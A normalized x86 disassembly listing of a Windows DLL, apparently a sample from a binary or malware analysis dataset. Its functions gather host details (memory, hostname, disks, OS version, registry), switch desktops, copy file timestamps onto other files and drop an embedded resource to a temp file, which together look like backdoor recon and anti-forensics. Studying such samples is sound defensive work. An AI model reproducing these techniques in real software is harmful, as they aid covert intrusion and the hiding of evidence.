sub esp 0x804
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push r--data
push esi
call sub_1000b34d
xor eax eax
push 0x7fe
push eax
mov [ ebp - 0x804 ] ax
lea eax [ ebp - 0x802 ]
push eax
call sub_1000b660
lea ebx [ ebp - 0x804 ]
call sub_10007a41
mov eax ebx
push eax
push esi
call sub_1000b31f
mov ecx [ ebp - 0x4 ]
add esp 0x1c
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
sub_100074b5
push ebp
mov ebp esp
sub esp 0xe90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
push edi
xor eax eax
xor esi esi
mov [ ebp - 0x1c ] esi
lea edi [ ebp - 0x18 ]
stosd [ edi ]
stosd [ edi ]
xor eax eax
push 0x7fe
mov [ ebp - 0xa24 ] ax
lea eax [ ebp - 0xa22 ]
push esi
push eax
call sub_1000b660
push 0x3ff
lea eax [ ebp - 0xe23 ]
push esi
push eax
mov [ ebp - 0xe24 ] 0x0
call sub_1000b660
mov ebx [ RegOpenKeyW@IAT ]
add esp 0x18
xor edi edi
xor eax eax
push 0x208
lea eax [ ebp - 0x224 ]
push eax
push r--data
lea esi [ ebp - 0xe28 ]
call sub_10007311
add esp 0xc
xor esi esi
jmp r-xdata
lea eax [ ebp - 0xe6c ]
push eax
mov [ ebp - 0xe6c ] 0x20
call [ GlobalMemoryStatus@IAT ]
mov eax [ ebp - 0xe60 ]
mov edi [ ebp + 0x8 ]
shr eax 0x14
push eax
mov eax [ ebp - 0xe64 ]
shr eax 0x14
push eax
push r--data
push edi
call sub_10006e8e
push 0x208
lea eax [ ebp - 0x224 ]
push esi
push eax
call sub_1000b660
push 0x800
lea eax [ ebp - 0xa24 ]
push esi
push eax
call sub_1000b660
lea esi [ ebp - 0xa24 ]
call sub_10007457
mov eax esi
push eax
push r--data
push edi
call sub_10006e8e
add esp 0x34
lea eax [ ebp - 0xe28 ]
push eax
push r--data
push 0x80000002
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x224 ]
push eax
call sub_100082fb
push eax
push edi
push r--data
push [ ebp + 0x8 ]
call sub_10006e8e
add esp 0x14
jmp r-xdata
cmp eax esi
je r-xdata
lea eax [ ebp - 0x224 ]
push eax
push r--data
push edi
call sub_10006e8e
add esp 0xc
lea eax [ ebp - 0xe28 ]
push eax
push r--data
push 0x80000002
call ebx
test eax eax
jne r-xdata
push 0x208
lea eax [ ebp - 0x224 ]
push eax
push r--data
lea esi [ ebp - 0xe28 ]
call sub_10007311
add esp 0xc
push edi
lea eax [ ebp - 0xa24 ]
push r--data
push eax
call sub_10001000
add esp 0xc
lea eax [ ebp - 0xe28 ]
push eax
lea eax [ ebp - 0xa24 ]
push eax
push 0x80000002
inc edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x224 ]
push eax
push r--data
push edi
call sub_10006e8e
add esp 0xc
lea eax [ ebp - 0xe28 ]
push eax
push r--data
push 0x80000002
call ebx
test eax eax
jne r-xdata
push 0x208
lea eax [ ebp - 0x224 ]
push eax
push r--data
lea esi [ ebp - 0xe28 ]
call sub_10007311
add esp 0xc
lea eax [ ebp - 0x224 ]
push eax
push r--data
push edi
call sub_10006e8e
add esp 0xc
mov esi 0x400
push esi
lea eax [ ebp - 0xe24 ]
push eax
call [ gethostname@IAT ]
test eax eax
jne r-xdata
push 0x208
lea eax [ ebp - 0x224 ]
push eax
push r--data
lea esi [ ebp - 0xe28 ]
call sub_10007311
add esp 0xc
call [ GetTickCount@IAT ]
mov ecx eax
xor edx edx
mov esi 0x5265c00
div esi
mov esi 0xea60
mov ebx esi
mov [ ebp - 0xe28 ] edx
mov [ ebp - 0xe30 ] eax
xor edx edx
mov eax ecx
div ebx
mov ebx 0x3e8
mov eax edx
xor edx edx
div ebx
xor edx edx
push eax
mov eax ecx
mov ecx 0x36ee80
mov ebx ecx
div ebx
mov eax edx
xor edx edx
div esi
xor edx edx
push eax
mov eax [ ebp - 0xe28 ]
div ecx
push eax
push [ ebp - 0xe30 ]
push r--data
push edi
call sub_10006e8e
mov esi 0x104
push esi
xor ebx ebx
lea eax [ ebp - 0x224 ]
push ebx
push eax
call sub_1000b660
add esp 0x24
push esi
lea eax [ ebp - 0x224 ]
push eax
call [ GetSystemDirectoryW@IAT ]
lea eax [ ebp - 0x224 ]
push eax
push r--data
push edi
call sub_10006e8e
add esp 0xc
lea eax [ ebp - 0xe90 ]
push eax
call [ GetSystemInfo@IAT ]
push [ ebp - 0xe7c ]
push r--data
push edi
call sub_10006e8e
add esp 0xc
push ebx
push r--data
push ebx
call sub_1000d030
pop ecx
pop ecx
push eax
push 0x400
lea ebx [ ebp - 0xa24 ]
call sub_10008171
push eax
push r--data
push edi
call sub_10006e8e
add esp 0x18
xor eax eax
push eax
push eax
push eax
push r--data
call [ CreateDCW@IAT ]
mov esi [ GetDeviceCaps@IAT ]
mov ebx eax
push 0x8
push ebx
call esi
push 0xa
push ebx
mov [ ebp - 0xe2c ] eax
call esi
push 0xc
push ebx
mov [ ebp - 0xe28 ] eax
call esi
push 0x74
push ebx
mov [ ebp - 0xe30 ] eax
call esi
push ebx
mov esi eax
call [ DeleteDC@IAT ]
push esi
push [ ebp - 0xe30 ]
push [ ebp - 0xe28 ]
push [ ebp - 0xe2c ]
push r--data
push edi
call sub_10006e8e
push r--data
push edi
call sub_10006e8e
add esp 0x20
xor esi esi
mov [ ebp - 0xe28 ] esi
push eax
lea eax [ ebp - 0xe24 ]
push eax
push esi
lea ebx [ ebp - 0xa24 ]
call sub_10008171
push eax
lea eax [ ebp - 0x224 ]
push eax
call sub_1000b34d
lea eax [ ebp - 0x224 ]
push eax
push r--data
push edi
call sub_10006e8e
add esp 0x20
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x224 ]
push r--data
push eax
call sub_10001000
add esp 0xc
dec eax
je r-xdata
push 0x208
lea eax [ ebp - 0x224 ]
push esi
push eax
call sub_1000b660
add esp 0xc
inc [ ebp - 0xe28 ]
cmp [ ebp - 0xe28 ] 0x1a
jl r-xdata
lea eax [ ebp - 0x224 ]
push eax
push edi
call sub_10006e8e
pop ecx
pop ecx
push 0xc
lea eax [ ebp - 0x1c ]
push eax
push esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x10 ]
push eax
call [ GetVolumeInformationW@IAT ]
lea eax [ ebp - 0xe3c ]
push eax
lea eax [ ebp - 0xe44 ]
push eax
lea eax [ ebp - 0xe4c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ GetDiskFreeSpaceExW@IAT ]
push esi
mov esi [ ebp - 0xe38 ]
push 0x64
push esi
push [ ebp - 0xe3c ]
call sub_100169a0
mov ebx [ ebp - 0xe40 ]
push ebx
push [ ebp - 0xe44 ]
push edx
push eax
call sub_10016930
push edx
push eax
mov eax [ ebp - 0xe3c ]
shrd eax esi 0x14
shr esi 0x14
push esi
push eax
mov eax [ ebp - 0xe44 ]
shrd eax ebx 0x14
shr ebx 0x14
push ebx
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x224 ]
push r--data
push eax
call sub_10001000
add esp 0x28
xor esi esi
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xe28 ]
add eax 0x41
push eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call sub_10001000
add esp 0xc
lea eax [ ebp - 0x10 ]
push eax
call [ GetDriveTypeW@IAT ]
mov ebx eax
dec eax
dec eax
je r-xdata
call [ GetCurrentProcessId@IAT ]
fld [ rw-data ]
push eax
push rw-data
push rw-data
push rw-data
push ecx
push ecx
fstp [ esp ]
push r--data
push edi
call sub_10006e8e
mov ecx [ ebp - 0x8 ]
add esp 0x20
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
lea eax [ ebp - 0x10 ]
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x224 ]
push eax
call sub_10001000
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push r--data
jmp r-xdata
dec eax
jne r-xdata
cmp ebx 0x1
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push r--data
sub_10007a41
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x1ec
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
push esi
push 0x24
lea eax [ ebp - 0x174 ]
push 0x0
push eax
call sub_1000b660
mov esi 0x11c
push esi
lea eax [ ebp - 0x148 ]
push 0x0
push eax
call sub_1000b660
add esp 0x18
lea eax [ ebp - 0x148 ]
push eax
mov [ ebp - 0x148 ] esi
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
push edi
mov edi [ GetModuleHandleW@IAT ]
push r--data
push r--data
call edi
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
inc eax
jmp r-xdata
lea eax [ ebp - 0x174 ]
push eax
call [ GetSystemInfo@IAT ]
lea ecx [ ebp - 0x174 ]
push ecx
call eax
jmp r-xdata
mov ecx [ ebp + 0x74 ]
xor ecx ebp
pop esi
call sub_1000ac69
add ebp 0x78
leave
retn
xor eax eax
cmp [ ebp - 0x144 ] 0x4
jbe r-xdata
cmp [ ebp - 0x138 ] 0x2
jne r-xdata
push r--data
mov esi 0x400
push esi
mov eax ebx
call sub_1000733f
cmp [ ebp - 0x144 ] 0x6
jne r-xdata
cmp [ ebp - 0x144 ] 0x5
jne r-xdata
cmp [ ebp - 0x140 ] 0x0
jne r-xdata
and [ ebp - 0x14c ] 0x0
lea edi [ ebp - 0x14c ]
mov edx 0x104
lea eax [ ebp - 0x134 ]
call sub_100073f7
test eax eax
jge r-xdata
cmp [ ebp - 0x140 ] 0x2
jne r-xdata
cmp [ ebp - 0x140 ] 0x1
jne r-xdata
cmp [ ebp - 0x2e ] 0x1
mov eax ebx
jne r-xdata
cmp [ ebp - 0x14c ] 0x0
jbe r-xdata
and [ ebp - 0x14c ] 0x0
cmp [ ebp - 0x140 ] 0x1
mov edi r--data
jne r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
push r--data
push r--data
call edi
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x2e ] 0x1
mov eax ebx
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push [ ebp - 0x13c ]
lea edi [ ebp - 0x2c ]
push r--data
push 0x50
pop ecx
call sub_100073aa
pop ecx
pop ecx
mov eax edi
push eax
push 0x450
mov eax ebx
call sub_1000733f
xor eax eax
inc eax
jmp r-xdata
push r--data
push esi
mov eax ebx
call sub_1000733f
lea eax [ ebp - 0x134 ]
push eax
push esi
mov eax ebx
call sub_1000733f
cmp [ ebp - 0x140 ] 0x0
jne r-xdata
push r--data
push esi
mov eax ebx
call sub_1000733f
mov ecx [ ebp - 0x30 ]
mov eax 0x200
and ecx eax
cmp cx ax
mov eax ebx
jne r-xdata
mov eax 0x2000
cmp [ ebp - 0x30 ] ax
jne r-xdata
push r--data
jmp r-xdata
mov eax [ ebp - 0x150 ]
cmp eax 0xa
ja r-xdata
lea ecx [ ebp - 0x150 ]
push ecx
xor ecx ecx
push ecx
push ecx
push ecx
push 0x6
call eax
push r--data
push r--data
jmp r-xdata
push esi
call sub_1000733f
pop edi
push r--data
push esi
mov eax ebx
call sub_1000733f
cmp [ ebp - 0x2e ] 0x1
jne r-xdata
push edi
push r--data
jmp r-xdata
cmp [ ebp - 0x2e ] 0x1
jne r-xdata
push r--data
jmp r-xdata
push esi
mov eax ebx
call sub_1000733f
cmp [ ebp - 0x2e ] 0x1
je r-xdata
cmp eax 0xf
ja r-xdata
je r-xdata
test [ ebp - 0x30 ] 0x80
je r-xdata
push edi
jmp r-xdata
push esi
call sub_1000733f
cmp [ ebp - 0x144 ] 0x5
jne r-xdata
push r--data
cmp [ ebp - 0x174 ] 0x9
jne r-xdata
cmp [ ebp - 0x144 ] 0x5
jne r-xdata
cmp [ ebp - 0x174 ] 0x6
jne r-xdata
sub eax 0x11
je r-xdata
je r-xdata
push r--data
jmp r-xdata
dec eax
cmp eax 0x8
ja r-xdata
test [ ebp - 0x30 ] 0x2
je r-xdata
push r--data
jmp r-xdata
push esi
mov eax ebx
call sub_1000733f
push r--data
jmp r-xdata
cmp [ ebp - 0x174 ] 0x9
jne r-xdata
test [ ebp - 0x30 ] 0x80
je r-xdata
push r--data
dec eax
je r-xdata
push r--data
jmp r-xdata
sub eax 0xb
je r-xdata
push esi
mov eax ebx
call sub_1000733f
cmp [ ebp - 0x174 ] 0x9
jne r-xdata
push r--data
jmp r-xdata
jmp [ eax * 4 + jump_table_10007e8d ]
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov ecx 0x4000
mov edx eax
and edx ecx
cmp dx cx
jne r-xdata
test [ ebp - 0x30 ] 0x80
je r-xdata
test [ ebp - 0x30 ] 0x2
je r-xdata
push r--data
jmp r-xdata
cmp [ ebp - 0x174 ] 0x0
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
sub eax 0x7
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
test al al
jns r-xdata
push r--data
jmp r-xdata
test [ ebp - 0x30 ] 0x2
mov eax ebx
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
mov eax ebx
push r--data
push esi
mov eax ebx
call sub_1000733f
push r--data
jmp r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
test al 0x2
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
and eax esi
mov ecx esi
cmp ax cx
jne r-xdata
push r--data
jmp r-xdata
push esi
call sub_1000733f
push r--data
jmp r-xdata
push r--data
push r--data
jmp r-xdata
sub_10007eb1
push ebp
mov ebp esp
sub esp 0x10
push 0x10
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000ac80
add esp 0xc
push [ ebp - 0x4 ]
call [ SetEvent@IAT ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0xc ]
call [ ebp - 0x10 ]
leave
retn 0x4
push 0x0
call sub_10008088
pop ecx
sub_10007ee9
push ebp
mov ebp esp
sub esp 0x10
push esi
xor esi esi
push esi
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
push esi
push esi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x1
call [ CreateEventW@IAT ]
push esi
push esi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
push sub_10007eb1
push esi
push esi
call sub_1000bea9
add esp 0x18
push 0xffffffff
push [ ebp - 0x4 ]
mov esi eax
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov eax esi
pop esi
leave
retn
sub_10007f3c
push ebp
lea ebp [ esp - 0x394 ]
sub esp 0x414
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x390 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x78 ] ebx
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
mov esi 0x200
push esi
mov [ ebp - 0x7c ] eax
lea eax [ ebp + 0x190 ]
push ebx
push eax
call sub_1000b660
mov edi [ GetUserObjectInformationW@IAT ]
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
push esi
lea eax [ ebp + 0x190 ]
push eax
push 0x2
push [ ebp - 0x7c ]
call edi
push 0x2000000
push ebx
push ebx
call [ OpenInputDesktop@IAT ]
push esi
mov [ ebp - 0x74 ] eax
lea eax [ ebp - 0x70 ]
push ebx
push eax
call sub_1000b660
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
push esi
lea eax [ ebp - 0x70 ]
push eax
push 0x2
push [ ebp - 0x74 ]
call edi
lea eax [ ebp + 0x190 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x7c ]
mov esi [ CloseDesktop@IAT ]
call esi
push [ ebp - 0x74 ]
call esi
cmp [ ebp - 0x78 ] ebx
mov ecx [ ebp + 0x390 ]
pop edi
setne al
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
add ebp 0x394
leave
retn
push [ ebp - 0x74 ]
call [ SetThreadDesktop@IAT ]
mov [ ebp - 0x78 ] 0x1
sub_1000801f
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
mov edi eax
lea eax [ ebp - 0x108 ]
push eax
push 0x100
lea eax [ ebp - 0x104 ]
push eax
push 0x2
push esi
call [ GetUserObjectInformationW@IAT ]
test eax eax
jne r-xdata
push esi
call [ SetThreadDesktop@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push edi
call [ CloseDesktop@IAT ]
xor eax eax
inc eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_1000ac69
leave
retn
sub_10008088
push esi
push edi
xor edi edi
push 0x400001cf
push edi
push edi
cmp [ esp + 0x18 ] edi
je r-xdata
call [ OpenInputDesktop@IAT ]
push [ esp + 0x18 ]
call [ OpenDesktopW@IAT ]
jmp r-xdata
call sub_1000801f
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov esi eax
cmp esi edi
jne r-xdata
xor eax eax
inc eax
push esi
call [ CloseDesktop@IAT ]
jmp r-xdata
pop edi
pop esi
retn
sub_100080cd
push esi
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
push r--data
mov esi eax
call sub_10008088
pop ecx
test eax eax
jne r-xdata
push 0x2e0003
push 0x0
push 0x312
push 0xffff
call [ PostMessageW@IAT ]
test esi esi
je r-xdata
pop esi
retn
xor eax eax
inc eax
pop esi
retn
call sub_1000801f
sub_10008113
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] ebx
je r-xdata
push esi
push edi
push [ ebp + 0x10 ]
call sub_1000b3ed
mov esi [ WideCharToMultiByte@IAT ]
pop ecx
push ebx
push ebx
push ebx
push ebx
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
push ebx
push [ ebp + 0x14 ]
call esi
mov edi eax
cmp edi [ ebp + 0xc ]
jbe r-xdata
push ebx
push ebx
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push [ ebp + 0x10 ]
push ebx
push [ ebp + 0x14 ]
call esi
mov eax [ ebp + 0x8 ]
mov [ edi + eax ] bl
pop edi
pop esi
jmp r-xdata
mov edi [ ebp + 0xc ]
pop ebx
leave
retn
sub_10008171
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
cmp ebx esi
je r-xdata
xor eax eax
cmp [ ebp + 0xc ] esi
je r-xdata
push edi
push [ ebp + 0xc ]
call sub_1000b9b0
pop ecx
push esi
push esi
push eax
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
push [ ebp + 0x10 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
mov edi eax
mov eax [ ebp + 0x8 ]
cmp edi eax
jb r-xdata
push edi
push ebx
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x10 ]
call esi
xor eax eax
mov [ ebx + edi * 2 ] ax
mov eax ebx
pop edi
jmp r-xdata
lea edi [ eax - 0x1 ]
pop esi
leave
retn
sub_100081cb
push ebp
mov ebp esp
sub esp 0xc
movzx ecx [ edx ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x1 ] 0x0
test cx cx
je r-xdata
xor ecx ecx
mov [ eax ] cx
sub eax [ ebp - 0x8 ]
sar eax 0x1
leave
retn
push ebx
push esi
mov ebx 0x206
push edi
cmp cx 0x2e
jne r-xdata
dec esi
je r-xdata
test cx cx
je r-xdata
lea esi [ edx + 0x2 ]
movzx edi [ esi ]
cmp di 0x5c
je r-xdata
cmp [ eax - 0x2 ] 0x5c
je r-xdata
sub esi 0x2d
jne r-xdata
pop edi
pop esi
pop ebx
mov esi eax
sub esi [ ebp - 0x8 ]
mov edx esi
movzx ecx [ edx ]
cmp cx 0x5c
je r-xdata
cmp di 0x2f
je r-xdata
inc edx
inc edx
jmp r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
movzx ecx [ edx ]
test cx cx
jne r-xdata
cmp cx 0x2f
je r-xdata
cmp cx 0x2f
jne r-xdata
test di di
jne r-xdata
push 0x5c
pop ecx
mov [ eax ] cx
inc eax
inc eax
mov ecx eax
sub ecx [ ebp - 0x8 ]
and ecx 0xfffffffe
cmp ecx ebx
jge r-xdata
mov [ ebp - 0xc ] eax
mov [ ebp - 0x1 ] 0x1
movzx esi cx
sub esi 0x2e
je r-xdata
mov [ eax ] cx
inc eax
inc eax
inc esi
inc esi
inc edx
mov ecx esi
and ecx 0xfffffffe
inc edx
cmp ecx ebx
jge r-xdata
jmp r-xdata
cmp di 0x2e
jne r-xdata
movzx ecx [ edx ]
test cx cx
jne r-xdata
lea edi [ edx + 0x4 ]
movzx esi [ edi ]
cmp si 0x5c
je r-xdata
cmp cx 0x5c
je r-xdata
push 0x5c
pop ecx
jmp r-xdata
cmp si 0x2f
je r-xdata
cmp [ eax ] cx
jne r-xdata
test si si
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
cmp eax [ ebp - 0xc ]
je r-xdata
dec eax
dec eax
cmp [ eax ] cx
jne r-xdata
dec eax
dec eax
cmp [ eax ] cx
jne r-xdata
mov edx edi
jmp r-xdata
inc eax
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
sub_100082fb
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
push 0x1
mov esi r--data
push esi
push ebp
xor edi edi
call sub_1000d2bb
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp + edi * 2 ]
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx ebp
inc edi
push 0x1
inc ebx
inc ebx
push esi
push ebx
call sub_1000d2bb
add esp 0xc
test eax eax
je r-xdata
pop ebx
sub_10008338
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi [ CreateFileW@IAT ]
push edi
xor ebx ebx
push ebx
mov edi 0x2000000
push edi
push 0x3
push ebx
push 0x1
push 0x80000000
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x4 ] eax
cmp eax 0xffffffff
je r-xdata
mov edi ebx
push ebx
push edi
push 0x3
push ebx
push 0x5
push 0xc0000000
push [ ebp + 0xc ]
call esi
mov edi eax
cmp edi 0xffffffff
je r-xdata
cmp edi 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
call esi
call [ GetLastError@IAT ]
push ebx
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push 0x400
push eax
push ebx
push 0x1100
call [ FormatMessageW@IAT ]
push [ ebp - 0xc ]
call [ LocalFree@IAT ]
cmp [ ebp - 0x4 ] 0xffffffff
mov esi [ CloseHandle@IAT ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x4 ]
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push edi
call esi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call [ SetFileTime@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
mov esi [ CloseHandle@IAT ]
call esi
push edi
call esi
xor eax eax
inc eax
sub_1000840b
push 0x10
push r--data
call sub_10011ecc
xor esi esi
push esi
push 0x80
push 0x3
push esi
push 0x1
push 0x80000000
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
mov edi eax
mov [ ebp - 0x20 ] edi
cmp edi 0xffffffff
jne r-xdata
mov [ ebp - 0x4 ] esi
push esi
push edi
call [ GetFileSize@IAT ]
mov ebx eax
push esi
push esi
lea eax [ ebx - 0x1a0 ]
push eax
push edi
call [ SetFilePointer@IAT ]
push esi
lea eax [ ebp - 0x1c ]
push eax
mov esi 0x1a0
push esi
push [ ebp + 0x8 ]
push edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
push ebx
push esi
push [ ebp - 0x1c ]
call sub_1001265d
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10019a78
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
call sub_10011f11
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp ecx 0xcc716
je r-xdata
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10019a78
add esp 0xc
mov al 0x1
push [ eax + 0xd0 ]
push ecx
call sub_1001265d
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10019a78
add esp 0x14
jmp r-xdata
sub_100084f0
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ CreateFileW@IAT ]
xor esi esi
push esi
mov ebx 0x80
push ebx
push 0x3
push esi
push esi
push 0x80000000
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax esi
jne r-xdata
push esi
push eax
call [ GetFileSize@IAT ]
push eax
mov [ ebp - 0x4 ] eax
call sub_1000c036
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_1001265d
add esp 0x4
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp - 0x4 ]
mov [ ebp - 0x10 ] esi
push eax
push [ ebp - 0x1c ]
call [ ReadFile@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x10 ] eax
jne r-xdata
call sub_1001265d
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
call sub_1001c65c
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
je r-xdata
xor eax eax
inc eax
jmp r-xdata
push eax
call sub_1000c036
pop ecx
mov [ ebp - 0xc ] eax
cmp eax esi
je r-xdata
call sub_1000d361
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_1001c5dc
add esp 0x10
mov [ ebp - 0x4 ] eax
call sub_1000d361
mov eax [ ebp - 0x14 ]
cmp [ ebp - 0x4 ] eax
jne r-xdata
push esi
push ebx
push 0x2
push esi
push esi
push 0x40000000
push [ ebp + 0xc ]
call edi
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push esi
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] esi
mov esi [ ebp - 0x4 ]
push esi
push [ ebp - 0xc ]
push edi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
call sub_1001265d
push [ ebp - 0x1c ]
mov esi [ CloseHandle@IAT ]
call esi
push edi
call esi
push [ ebp - 0x8 ]
call sub_1000bf59
push [ ebp - 0xc ]
call sub_1000bf59
pop ecx
pop ecx
xor eax eax
cmp [ ebp - 0x18 ] esi
jne r-xdata
call sub_1001265d
sub_1000861c
push ebp
lea ebp [ esp - 0x5b0 ]
sub esp 0x630
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x5ac ] eax
mov eax [ ebp + 0x5b8 ]
push ebx
push esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x70 ] eax
xor eax eax
push 0x206
mov [ ebp + 0x3a4 ] ax
xor esi esi
lea eax [ ebp + 0x3a6 ]
push esi
push eax
call sub_1000b660
add esp 0xc
lea eax [ ebp - 0x6c ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
push r--data
push 0x65
push edi
call [ FindResourceW@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
call sub_1001265d
xor eax eax
call sub_1001265d
push ebx
push edi
call [ LoadResource@IAT ]
cmp eax esi
je r-xdata
call sub_1001265d
push eax
call [ LockResource@IAT ]
mov [ ebp - 0x7c ] eax
cmp eax esi
je r-xdata
call sub_1001265d
push ebx
push edi
call [ SizeofResource@IAT ]
mov [ ebp - 0x78 ] eax
cmp eax esi
je r-xdata
mov edi [ GetTempFileNameW@IAT ]
lea eax [ ebp + 0x19c ]
push eax
push esi
mov ebx r--data
push ebx
lea eax [ ebp - 0x6c ]
push eax
call edi
test eax eax
je r-xdata
push esi
push 0x80
push 0x2
push esi
push esi
push 0x40000000
lea eax [ ebp + 0x19c ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x80 ] eax
cmp eax 0xffffffff
je r-xdata
call sub_1001265d
push esi
lea ecx [ ebp - 0x74 ]
push ecx
push [ ebp - 0x78 ]
mov [ ebp - 0x74 ] esi
push [ ebp - 0x7c ]
push eax
call [ WriteFile@IAT ]
test eax eax
je r-xdata
lea eax [ ebp + 0x19c ]
push eax
call [ DeleteFileW@IAT ]
mov eax [ ebp - 0x78 ]
cmp [ ebp - 0x74 ] eax
jne r-xdata
call sub_1001265d
push [ ebp - 0x80 ]
call [ CloseHandle@IAT ]
lea eax [ ebp + 0x3a4 ]
push eax
